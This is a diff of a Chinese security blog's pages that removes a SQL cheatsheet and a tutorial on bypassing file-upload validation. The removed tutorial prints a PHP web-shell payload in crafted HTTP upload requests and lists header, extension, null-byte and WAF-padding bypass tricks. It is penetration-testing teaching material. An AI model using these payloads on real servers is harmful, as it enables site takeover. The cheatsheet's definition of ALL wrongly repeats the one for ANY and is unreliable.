-<li><code>LIKE</code> ‘a%’    （查找任何以“a”开头的值）</li>
-<li><code>LIKE</code> ‘%a’    （查找任何以“a”结尾的值）</li>
-<li><code>LIKE</code> ‘%or%’  （查找任何包含“or”的值）</li>
-<li><code>LIKE</code> ‘_r%’   （查找任何第二位是“r”的值）</li>
-<li><code>LIKE</code> ‘a_%_%’ （查找任何以“a”开头且长度至少为3的值）</li>
-<li><code>LIKE</code> ‘[a-c]%’（查找任何以“a”或“b”或“c”开头的值）</li>
-</ul>
-<h3 id="IN-用于在-WHERE-子句中指定多个值的运算符"><a href="#IN-用于在-WHERE-子句中指定多个值的运算符" class="headerlink" title="IN: 用于在 WHERE 子句中指定多个值的运算符"></a><strong>IN</strong>: 用于在 WHERE 子句中指定多个值的运算符</h3><ul>
-<li>本质上，IN运算符是多个OR条件的简写</li>
-<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>IN</code> (value1, value2, …);</li>
-<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>IN</code> (<code>SELECT STATEMENT</code>);</li>
-</ul>
-<h3 id="BETWEEN-用于过滤给定范围的值的运算符"><a href="#BETWEEN-用于过滤给定范围的值的运算符" class="headerlink" title="BETWEEN: 用于过滤给定范围的值的运算符"></a><strong>BETWEEN</strong>: 用于过滤给定范围的值的运算符</h3><ul>
-<li><code>SELECT</code> column_names <code>FROM</code> table_name <code>WHERE</code> column_name <code>BETWEEN</code> value1 <code>AND</code> value2;</li>
-<li><code>SELECT</code> * <code>FROM</code> Products <code>WHERE</code> (column_name <code>BETWEEN</code> value1 <code>AND</code> value2) <code>AND NOT</code> column_name2 <code>IN</code> (value3, value4);</li>
-<li><code>SELECT</code> * <code>FROM</code> Products <code>WHERE</code> column_name <code>BETWEEN</code> #01/07/1999# AND #03/12/1999#;</li>
-</ul>
-<h3 id="NULL-代表一个字段没有值"><a href="#NULL-代表一个字段没有值" class="headerlink" title="NULL: 代表一个字段没有值"></a><strong>NULL</strong>: 代表一个字段没有值</h3><ul>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> column_name <code>IS NULL</code>;</li>
-<li><code>SELECT</code> * <code>FROM</code> table_name <code>WHERE</code> column_name <code>IS NOT NULL</code>;</li>
-</ul>
-<h3 id="AS-用于给表或者列分配别名"><a href="#AS-用于给表或者列分配别名" class="headerlink" title="AS: 用于给表或者列分配别名"></a><strong>AS</strong>: 用于给表或者列分配别名</h3><ul>
-<li><code>SELECT</code> column_name <code>AS</code> alias_name <code>FROM</code> table_name;</li>
-<li><code>SELECT</code> column_name <code>FROM</code> table_name <code>AS</code> alias_name;</li>
-<li><code>SELECT</code> column_name <code>AS</code> alias_name1, column_name2 <code>AS</code> alias_name2;</li>
-<li><code>SELECT</code> column_name1, column_name2 + ‘, ‘ + column_name3 <code>AS</code> alias_name;</li>
-</ul>
-<h3 id="UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符"><a href="#UNION-用于组合两个或者多个-SELECT-语句的结果集的运算符" class="headerlink" title="UNION: 用于组合两个或者多个 SELECT 语句的结果集的运算符"></a><strong>UNION</strong>: 用于组合两个或者多个 SELECT 语句的结果集的运算符</h3><ul>
-<li>每个 SELECT 语句必须拥有相同的列数</li>
-<li>列必须拥有相似的数据类型</li>
-<li>每个 SELECT 语句中的列也必须具有相同的顺序</li>
-<li><code>SELECT</code> columns_names <code>FROM</code> table1 <code>UNION SELECT</code> column_name <code>FROM</code> table2;</li>
-<li><code>UNION</code> 仅允许选择不同的值, <code>UNION ALL</code> 允许重复</li>
-</ul>
-<h3 id="ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符"><a href="#ANY-ALL-用于检查-WHERE-或-HAVING-子句中使用的子查询条件的运算符" class="headerlink" title="ANY|ALL: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符"></a><strong>ANY|ALL</strong>: 用于检查 WHERE 或 HAVING 子句中使用的子查询条件的运算符</h3><ul>
-<li><code>ANY</code> 如果任何子查询值满足条件，则返回 true。</li>
-<li><code>ALL</code> 如果任何子查询值满足条件，则返回 true。</li>
-<li><code>SELECT</code> columns_names <code>FROM</code> table1 <code>WHERE</code> column_name operator (<code>ANY</code>|<code>ALL</code>) (<code>SELECT</code> column_name <code>FROM</code> table_name <code>WHERE</code> condition);</li>
-</ul>
-<h3 id="GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"><a href="#GROUP-BY-通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列" class="headerlink" title="GROUP BY: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列"></a><strong>GROUP BY</strong>: 通常与聚合函数（COUNT，MAX，MIN，SUM，AVG）一起使用，用于将结果集分组为一列或多列</h3><ul>
-<li><code>SELECT</code> column_name1, COUNT(column_name2) <code>FROM</code> table_name <code>WHERE</code> condition <code>GROUP BY</code> column_name1 <code>ORDER BY</code> COUNT(column_name2) DESC;</li>
-</ul>
-<h3 id="HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。"><a href="#HAVING-HAVING-子句指定-SELECT-语句应仅返回聚合值满足指定条件的行。它被添加到-SQL-语言中，因为WHERE关键字不能与聚合函数一起使用。" class="headerlink" title="HAVING: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。"></a><strong>HAVING</strong>: HAVING 子句指定 SELECT 语句应仅返回聚合值满足指定条件的行。它被添加到 SQL 语言中，因为WHERE关键字不能与聚合函数一起使用。</h3><ul>
-<li><code>SELECT</code> <code>COUNT</code>(column_name1), column_name2 <code>FROM</code> table <code>GROUP BY</code> column_name2 <code>HAVING</code> <code>COUNT(</code>column_name1<code>)</code> &gt; 5;</li>
-</ul>
-<p><a name="modify"></a></p>
-<h1 id="2-修改数据的查询"><a href="#2-修改数据的查询" class="headerlink" title="2. 修改数据的查询"></a>2. 修改数据的查询</h1><h3 id="INSERT-INTO-用于在表中插入新记录-行"><a href="#INSERT-INTO-用于在表中插入新记录-行" class="headerlink" title="INSERT INTO: 用于在表中插入新记录/行"></a><strong>INSERT INTO</strong>: 用于在表中插入新记录/行</h3><ul>
-<li><code>INSERT INTO</code> table_name (column1, column2) <code>VALUES</code> (value1, value2);</li>
-<li><code>INSERT INTO</code> table_name <code>VALUES</code> (value1, value2 …);</li>
-</ul>
-<h3 id="UPDATE-用于修改表中的现有记录-行"><a href="#UPDATE-用于修改表中的现有记录-行" class="headerlink" title="UPDATE: 用于修改表中的现有记录/行"></a><strong>UPDATE</strong>: 用于修改表中的现有记录/行</h3><ul>
-<li><code>UPDATE</code> table_name <code>SET</code> column1 = value1, column2 = value2 <code>WHERE</code> condition;</li>
-<li><code>UPDATE</code> table_name <code>SET</code> column_name = value;</li>
-</ul>
-<h3 id="DELETE-用于删除表中的现有记录-行"><a href="#DELETE-用于删除表中的现有记录-行" class="headerlink" title="DELETE: 用于删除表中的现有记录/行"></a><strong>DELETE</strong>: 用于删除表中的现有记录/行</h3><ul>
-<li><code>DELETE FROM</code> table_name <code>WHERE</code> condition;</li>
-<li><code>DELETE</code> * <code>FROM</code> table_name;</li>
-</ul>
-<p><a name="report"></a></p>
-<h1 id="3-聚合查询"><a href="#3-聚合查询" class="headerlink" title="3. 聚合查询"></a>3. 聚合查询</h1><h3 id="COUNT-返回出现次数"><a href="#COUNT-返回出现次数" class="headerlink" title="COUNT: 返回出现次数"></a><strong>COUNT</strong>: 返回出现次数</h3><ul>
-<li><code>SELECT COUNT (DISTINCT</code> column_name<code>)</code>;</li>
-</ul>
-<h3 id="MIN-and-MAX-返回所选列的最小-最大值"><a href="#MIN-and-MAX-返回所选列的最小-最大值" class="headerlink" title="MIN() and MAX(): 返回所选列的最小/最大值"></a><strong>MIN() and MAX()</strong>: 返回所选列的最小/最大值</h3><ul>
-<li><code>SELECT MIN (</code>column_names<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
-<li><code>SELECT MAX (</code>column_names<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
-</ul>
-<h3 id="AVG-返回数字列的平均值"><a href="#AVG-返回数字列的平均值" class="headerlink" title="AVG(): 返回数字列的平均值"></a><strong>AVG()</strong>: 返回数字列的平均值</h3><ul>
-<li><code>SELECT AVG (</code>column_name<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
-</ul>
-<h3 id="SUM-返回数值列的总和"><a href="#SUM-返回数值列的总和" class="headerlink" title="SUM(): 返回数值列的总和"></a><strong>SUM()</strong>: 返回数值列的总和</h3><ul>
-<li><code>SELECT SUM (</code>column_name<code>) FROM</code> table_name <code>WHERE</code> condition;</li>
-</ul>
-<p><a name="joins"></a></p>
-<h1 id="4-连接查询"><a href="#4-连接查询" class="headerlink" title="4. 连接查询"></a>4. 连接查询</h1><h3 id="INNER-JOIN-内连接，返回在两张表中具有匹配值的记录"><a href="#INNER-JOIN-内连接，返回在两张表中具有匹配值的记录" class="headerlink" title="INNER JOIN: 内连接，返回在两张表中具有匹配值的记录"></a><strong>INNER JOIN</strong>: 内连接，返回在两张表中具有匹配值的记录</h3><ul>
-<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>INNER JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
-<li><code>SELECT</code> table1.column_name1, table2.column_name2, table3.column_name3 <code>FROM</code> ((table1 <code>INNER JOIN</code> table2 <code>ON</code> relationship) <code>INNER JOIN</code> table3 <code>ON</code> relationship);</li>
-</ul>
-<h3 id="LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"><a href="#LEFT-OUTER-JOIN-左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）" class="headerlink" title="LEFT (OUTER) JOIN: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）"></a><strong>LEFT (OUTER) JOIN</strong>: 左外连接，返回左表（table1）中的所有记录，以及右表中的匹配记录（table2）</h3><ul>
-<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>LEFT JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
-</ul>
-<h3 id="RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"><a href="#RIGHT-OUTER-JOIN-右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录" class="headerlink" title="RIGHT (OUTER) JOIN: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录"></a><strong>RIGHT (OUTER) JOIN</strong>: 右外连接，返回右表（table2）中的所有记录，以及左表（table1）中匹配的记录</h3><ul>
-<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>RIGHT JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
-</ul>
-<h3 id="FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。"><a href="#FULL-OUTER-JOIN-全外连接，全连接是左右外连接的并集-连接表包含被连接的表的所有记录-如果缺少匹配的记录-以-NULL-填充。" class="headerlink" title="FULL (OUTER) JOIN: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。"></a><strong>FULL (OUTER) JOIN</strong>: 全外连接，全连接是左右外连接的并集. 连接表包含被连接的表的所有记录, 如果缺少匹配的记录, 以 NULL 填充。</h3><ul>
-<li><code>SELECT</code> column_names <code>FROM</code> table1 <code>FULL OUTER JOIN</code> table2 <code>ON</code> table1.column_name=table2.column_name;</li>
-</ul>
-<h3 id="Self-JOIN-自连接，表自身连接"><a href="#Self-JOIN-自连接，表自身连接" class="headerlink" title="Self JOIN: 自连接，表自身连接"></a><strong>Self JOIN</strong>: 自连接，表自身连接</h3><ul>
-<li><code>SELECT</code> column_names <code>FROM</code> table1 T1, table1 T2 <code>WHERE</code> condition;</li>
-</ul>
-<p><a name="view"></a></p>
-<h1 id="5-视图查询"><a href="#5-视图查询" class="headerlink" title="5. 视图查询"></a>5. 视图查询</h1><h3 id="CREATE-创建视图"><a href="#CREATE-创建视图" class="headerlink" title="CREATE: 创建视图"></a><strong>CREATE</strong>: 创建视图</h3><ul>
-<li><code>CREATE VIEW</code> view_name <code>AS SELECT</code> column1, column2 <code>FROM</code> table_name <code>WHERE</code> condition;</li>
-</ul>
-<h3 id="SELECT-检索视图"><a href="#SELECT-检索视图" class="headerlink" title="SELECT: 检索视图"></a><strong>SELECT</strong>: 检索视图</h3><ul>
-<li><code>SELECT</code> * <code>FROM</code> view_name;</li>
-</ul>
-<h3 id="DROP-删除视图"><a href="#DROP-删除视图" class="headerlink" title="DROP: 删除视图"></a><strong>DROP</strong>: 删除视图</h3><ul>
-<li><code>DROP VIEW</code> view_name;</li>
-</ul>
-<p><a name="alter"></a></p>
-<h1 id="6-修改表的查询"><a href="#6-修改表的查询" class="headerlink" title="6. 修改表的查询"></a>6. 修改表的查询</h1><h3 id="ADD-添加字段"><a href="#ADD-添加字段" class="headerlink" title="ADD: 添加字段"></a><strong>ADD</strong>: 添加字段</h3><ul>
-<li><code>ALTER TABLE</code> table_name <code>ADD</code> column_name column_definition;</li>
-</ul>
-<h3 id="MODIFY-修改字段数据类型"><a href="#MODIFY-修改字段数据类型" class="headerlink" title="MODIFY: 修改字段数据类型"></a><strong>MODIFY</strong>: 修改字段数据类型</h3><ul>
-<li><code>ALTER TABLE</code> table_name <code>MODIFY</code> column_name column_type;</li>
-</ul>
-<h3 id="DROP-删除字段"><a href="#DROP-删除字段" class="headerlink" title="DROP: 删除字段"></a><strong>DROP</strong>: 删除字段</h3><ul>
-<li><code>ALTER TABLE</code> table_name <code>DROP COLUMN</code> column_name;</li>
-</ul>
-
+        <h1 id="内容"><a href="#内容" class="headerlink" title="内容"></a>内容</h1><ol>
+<li><a href="#find"> 查找数据的查询 </a></li>
+<li><a href="#modify"> 修改数据的查询 </a></li>
+<li><a href="#report"> 聚合查询 </a></li>
+<li><a href="#joins"> 连接查询 </a></li>
+<li><a href="#view"> 视图查询 </a></li>
+<li><a href="#alter"> 修改表的查询 </a><br><a href="https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md" target="_blank" rel="noopener">https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md</a></li>
+</ol>
+        
+          <p class="article-more-link ">
+            <a href="/quick-SQL-cheatsheet/#more"><i class="fa fa-coffee" style="padding-right: 2px"></i>Read More</a>
+          </p>
+        
       
 
     </div>
@@ -990,7 +372,7 @@ https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
 
     <footer class="article-footer">
       
-        <a data-url="http://pa55w0rd.github.io/quick-SQL-cheatsheet/" data-id="cjopkqnm20019j3t6u8lpmyr2" class="article-share-link" data-share="baidu" data-title="SQL 速查表">分享到</a>
+        <a data-url="http://pa55w0rd.github.io/quick-SQL-cheatsheet/" data-id="cjopl5zqc001bkbt6x8x1ngsm" class="article-share-link" data-share="baidu" data-title="SQL 速查表">分享到</a>
       
 
       
@@ -1050,234 +432,13 @@ https://github.com/enochtangg/quick-SQL-cheatsheet/edit/master/README_zh-hans.md
     
     <div class="article-entry" itemprop="articleBody">
       
-
-        <br>
-        <span id="busuanzi_container_page_pv">
-          阅读次数<span id="busuanzi_value_page_pv"></span>
-        </span>
-        <ul>
-<li>目录<br>{:toc}</li>
-</ul>
-<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。 </p>
+        <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>在web应用程序中，文件上传是一种常见的要求，因为它有助于提高业务效率。在大型社交网络程序中都支持文件上传功能。在博客，论坛，电子银行网络，会给用户和企业员工有效的共享文件。允许上传图片，视频，头像和许多其他类型文件。 </p>
 <p>上传文件的时候，如果服务器端脚本语言，未对上传的文件进行严格的验证和过滤，就有可能上传恶意的脚本文件，从而控制整个网站，甚至是服务器。 </p>
-<p><strong>漏洞挖掘和利用</strong></p>
-<p>查找上传点，图片，头像，附件；目录，文件扫描发现类似upload,php等文件，编译器目录如ewebeditor,fckeditor,kingeditor等 </p>
-<h2 id="0x01-文件上传校验姿势"><a href="#0x01-文件上传校验姿势" class="headerlink" title="0x01 文件上传校验姿势"></a>0x01 文件上传校验姿势</h2><ul>
-<li>客户端javascript校验（一般只校验后缀名）</li>
-<li>服务端校验<ul>
-<li>文件头content-type字段校验（image/gif）</li>
-<li>文件内容头校验（GIF89a）</li>
-<li>后缀名黑名单校验</li>
-<li>后缀名白名单校验</li>
-<li>自定义正则校验</li>
-</ul>
-</li>
-<li>WAF设备校验（根据不同的WAF产品而定）</li>
-</ul>
-<h3 id="1-1-客户端校验"><a href="#1-1-客户端校验" class="headerlink" title="1.1 客户端校验"></a>1.1 客户端校验</h3><p>一般都是在网页上写一段javascript脚本，校验上传文件的后缀名，有白名单形式也有黑名单形式。</p>
-<p>判断方式：在浏览加载文件，但还未点击上传按钮时便弹出对话框，内容如：只允许上传.jpg/.jpeg/.png后缀名的文件，而此时并没有发送数据包。</p>
-<h3 id="1-2-服务端校验"><a href="#1-2-服务端校验" class="headerlink" title="1.2 服务端校验"></a>1.2 服务端校验</h3><p><strong>1.2.1 content-type字段校验</strong></p>
-<p>这里以PHP代码为例，模拟web服务器端的校验代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>($_FILES[<span class="string">'userfile'</span>][<span class="string">'type'</span>] != <span class="string">"image/gif"</span>)  <span class="comment">#这里对上传的文件类型进行判断，如果不是image/gif类型便返回错误。</span></span><br><span class="line">        &#123;   </span><br><span class="line">         <span class="keyword">echo</span> <span class="string">"Sorry, we only allow uploading GIF images"</span>;</span><br><span class="line">         <span class="keyword">exit</span>;</span><br><span class="line">         &#125;</span><br><span class="line">    $uploaddir = <span class="string">'uploads/'</span>;</span><br><span class="line">    $uploadfile = $uploaddir . basename($_FILES[<span class="string">'userfile'</span>][<span class="string">'name'</span>]);</span><br><span class="line">    <span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'userfile'</span>][<span class="string">'tmp_name'</span>],$uploadfile))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File is valid, and was successfully uploaded.\n"</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"File uploading failed.\n"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">     <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-<p>可以看到代码对上传文件的文件类型进行了判断，如果不是图片类型，返回错误。</p>
-<p><strong>1.2.2 文件内容头校验</strong></p>
-<p>可以通过自己写正则匹配，判断文件头内容是否符合要求，这里举几个常见的文件头对应关系：</p>
-<ul>
-<li>.JPEG;.JPE;.JPG，”JPGGraphic File”</li>
-<li>.gif，”GIF 89A”</li>
-<li>.zip，”Zip Compressed”</li>
-<li>.doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile”</li>
-</ul>
-<h2 id="0x02-文件上传绕过校验姿势"><a href="#0x02-文件上传绕过校验姿势" class="headerlink" title="0x02 文件上传绕过校验姿势"></a>0x02 文件上传绕过校验姿势</h2><ul>
-<li>客户端绕过（抓包改包）</li>
-<li>服务端绕过<ul>
-<li>文件类型</li>
-<li>文件头</li>
-<li>文件后缀名</li>
-</ul>
-</li>
-<li>HTTP不安全方法(PUT方法)</li>
-<li>配合文件包含漏洞绕过</li>
-<li>配合服务器解析漏洞绕过</li>
-<li>CMS、编辑器漏洞绕过</li>
-<li>配合操作系统文件命名规则绕过</li>
-<li>配合其他规则绕过</li>
-<li>WAF绕过</li>
-</ul>
-<h3 id="2-1-客户端绕过"><a href="#2-1-客户端绕过" class="headerlink" title="2.1 客户端绕过"></a>2.1 客户端绕过</h3><p>可以利用burp抓包改包，先上传一个gif类型的木马，然后通过burp将其改为asp/php/jsp后缀名即可。</p>
-<h3 id="2-2-服务端绕过"><a href="#2-2-服务端绕过" class="headerlink" title="2.2 服务端绕过"></a>2.2 服务端绕过</h3><p><strong>2.2.1 文件类型绕过</strong></p>
-<p>我们可以通过抓包，将content-type字段改为image/gif</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST <span class="regexp">/upload.php HTTP/</span><span class="number">1.1</span></span><br><span class="line"><span class="string">TE:</span> deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line"><span class="string">Connection:</span> TE, close</span><br><span class="line"><span class="string">Host:</span> localhost</span><br><span class="line">User-<span class="string">Agent:</span> libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-<span class="string">Type:</span> multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-<span class="string">Length:</span> <span class="number">155</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-<span class="string">Disposition:</span> form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span></span><br><span class="line">Content-<span class="string">Type:</span> image<span class="regexp">/gif (原为 Content-Type: text/</span>plain)</span><br><span class="line">&lt;?php system($_GET['command']);?&gt;</span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
-<p><strong>2.2.2 文件头绕过</strong></p>
-<p>在木马内容基础上再加了一些文件信息，有点像下面的结构</p>
-<p><code>GIF89a&lt;?php phpinfo(); ?&gt;</code></p>
-<p>或构造图片吗，将恶意文本写入图片的二进制代码，避免破坏图片文件头和尾</p>
-<p><code>copy xx.jpg/b + yy.txt/a xy.jpg</code></p>
-<ul>
-<li><p>/b 即二进制[binary]模式</p>
-</li>
-<li><p>/a 即ascii模式 xx.jpg正常图片文件 </p>
-</li>
-</ul>
-<p><strong>2.2.3 文件后缀名绕过</strong></p>
-<p>前提：黑名单校验</p>
-<p>黑名单检测：一般有个专门的 blacklist 文件，里面会包含常见的危险脚本文件。</p>
-<p>绕过方法：</p>
-<ul>
-<li>找黑名单扩展名的漏网之鱼 - 比如 asa 和 cer 之类</li>
-<li>可能存在大小写绕过漏洞 - 比如 aSp 和 pHp 之类</li>
-</ul>
-<p>能被解析的文件扩展名列表：</p>
-<ul>
-<li>jsp jspx jspf</li>
-<li>asp asa cer aspx</li>
-<li>php php php3 php4</li>
-<li>exe exee</li>
-</ul>
-<h3 id="2-3-配合文件包含漏洞"><a href="#2-3-配合文件包含漏洞" class="headerlink" title="2.3 配合文件包含漏洞"></a>2.3 配合文件包含漏洞</h3><p>前提：校验规则只校验当文件后缀名为asp/php/jsp的文件内容是否为木马。</p>
-<p>绕过方式：（这里拿php为例，此漏洞主要存在于PHP中）</p>
-<ul>
-<li>先上传一个内容为木马的txt后缀文件，因为后缀名的关系没有检验内容；</li>
-<li>然后再上传一个.php的文件，内容为<code>&lt;?php Include(“上传的txt文件路径”);?&gt;</code></li>
-</ul>
-<p>此时，这个php文件就会去引用txt文件的内容，从而绕过校验，下面列举包含的语法：</p>
-<figure class="highlight erb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">#PHP    </span></span><br><span class="line"><span class="xml"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">Include</span>(<span class="string">"上传的txt文件路径"</span>);<span class="meta">?&gt;</span></span> </span></span><br><span class="line"><span class="xml">#ASP    </span></span><br><span class="line"><span class="xml"><span class="comment">&lt;!--#include file="上传的txt文件路径" --&gt;</span></span></span><br><span class="line"><span class="xml">#JSP    </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">jsp:inclde</span> <span class="attr">page</span>=<span class="string">"上传的txt文件路径"</span>/&gt;</span></span></span><br><span class="line"><span class="xml">or  </span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">%</span></span></span><span class="ruby">@include file=<span class="string">"上传的txt文件路径"</span></span><span class="xml"><span class="tag">%&gt;</span></span></span><br></pre></td></tr></table></figure>
-<h3 id="2-4-配合文件解析漏洞"><a href="#2-4-配合文件解析漏洞" class="headerlink" title="2.4 配合文件解析漏洞"></a>2.4 配合文件解析漏洞</h3><h3 id="2-5-配合操作系统文件命名规则"><a href="#2-5-配合操作系统文件命名规则" class="headerlink" title="2.5 配合操作系统文件命名规则"></a>2.5 配合操作系统文件命名规则</h3><ol>
-<li><p>上传不符合windows文件命名规则的文件名</p>
-<ul>
-<li>test.asp.</li>
-<li>test.asp(空格)</li>
-<li>test.php:1.jpg</li>
-<li>test.php::$DATA</li>
-<li><p>shell.php::$DATA…….</p>
-<p>会被windows系统自动去掉不符合规则符号后面的内容。</p>
-</li>
-</ul>
-</li>
-<li><p>linux下后缀名大小写</p>
-<p> 在linux下，如果上传php不被解析，可以试试上传pHp后缀的文件名。</p>
-</li>
-</ol>
-<h3 id="2-6-CMS、编辑器漏洞"><a href="#2-6-CMS、编辑器漏洞" class="headerlink" title="2.6 CMS、编辑器漏洞"></a>2.6 CMS、编辑器漏洞</h3><ol>
-<li>CMS漏洞：比如说JCMS等存在的漏洞，可以针对不同CMS存在的上传漏洞进行绕过。</li>
-<li>编辑器漏洞：比如FCK，ewebeditor等，可以针对编辑器的漏洞进行绕过。</li>
-</ol>
-<h3 id="2-7-配合其他规则"><a href="#2-7-配合其他规则" class="headerlink" title="2.7 配合其他规则"></a>2.7 配合其他规则</h3><p>0x00截断：基于一个组合逻辑漏洞造成的，通常存在于构造上传文件路径的时候</p>
-<ul>
-<li>test.php(0x00).jpg</li>
-<li>test.php%00.jpg</li>
-<li>路径/upload/1.php(0x00)，文件名1.jpg，结合/upload/1.php(0x00)/1.jpg</li>
-</ul>
-<p>伪代码演示：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">name= getname(httprequest) <span class="comment">//假如这时候获取到的文件名是 help.asp.jpg(asp 后面为 0x00)</span></span><br><span class="line">type =gettype(name)        <span class="comment">//而在 gettype()函数里处理方式是从后往前扫描扩展名，所以判断为 jpg</span></span><br><span class="line"><span class="keyword">if</span>(type == jpg)</span><br><span class="line">   SaveFileToPath(UploadPath.name, name)   <span class="comment">//但在这里却是以 0x00 作为文件名截断</span></span><br><span class="line"><span class="comment">//最后以 help.asp 存入路径里</span></span><br></pre></td></tr></table></figure></p>
-<h3 id="2-8-WAF绕过"><a href="#2-8-WAF绕过" class="headerlink" title="2.8 WAF绕过"></a>2.8 WAF绕过</h3><p><strong>2.8.1 垃圾数据</strong></p>
-<p>有些主机WAF软件为了不影响web服务器的性能，会对校验的用户数据设置大小上限，比如1M。此种情况可以构造一个大文件，前面1M的内容为垃圾内容，后面才是真正的木马内容，便可以绕过WAF对文件内容的校验；</p>
-<p>可以将垃圾数据放在数据包最开头，这样便可以绕过对文件名的校验。</p>
-<p>也可以将垃圾数据加上Content-Disposition参数后面，参数内容过长，可能会导致waf检测出错。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /upload.php HTTP/<span class="number">1.1</span></span><br><span class="line">TE: deflate,gzip;q=<span class="number">0.3</span></span><br><span class="line">Connection: TE, close</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: libwww-perl/<span class="number">5.803</span></span><br><span class="line">Content-Type: multipart/form-data; boundary=xYzZY</span><br><span class="line">Content-Length: <span class="number">155</span></span><br><span class="line"><span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line">--xYzZY</span><br><span class="line">Content-Disposition: form-data; name=<span class="string">"userfile"</span>; filename=<span class="string">"shell.php"</span>;<span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line">Content-Type: image/gif</span><br><span class="line"><span class="comment">/////////可以在这里添加a=11111111111....</span></span><br><span class="line"><span class="meta">&lt;?php</span> system($_GET[<span class="string">'command'</span>]);<span class="meta">?&gt;</span></span><br><span class="line">--xYzZY-</span><br></pre></td></tr></table></figure>
-<p><strong>2.8.2 filename</strong></p>
